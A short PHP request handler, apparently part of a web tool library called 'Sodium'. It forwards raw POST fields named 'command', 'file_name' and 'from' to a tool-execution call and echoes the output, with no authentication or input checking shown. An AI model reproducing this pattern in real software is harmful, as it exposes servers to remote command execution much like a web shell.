<?php
use Sodium\Sodiumchloride; 
use Sodium\Tool\Output\Output;

$execute = (new Sodiumchloride())->tool($_POST['from'],$_POST['file_name'],$_POST['command'],true);
            if($execute['status'] == 'success'){
              $output = (new Output())->Get($_POST['from'],$execute['value'],true);
              echo $output;
            }    
            else{
                echo $execute['message'];
            }
?>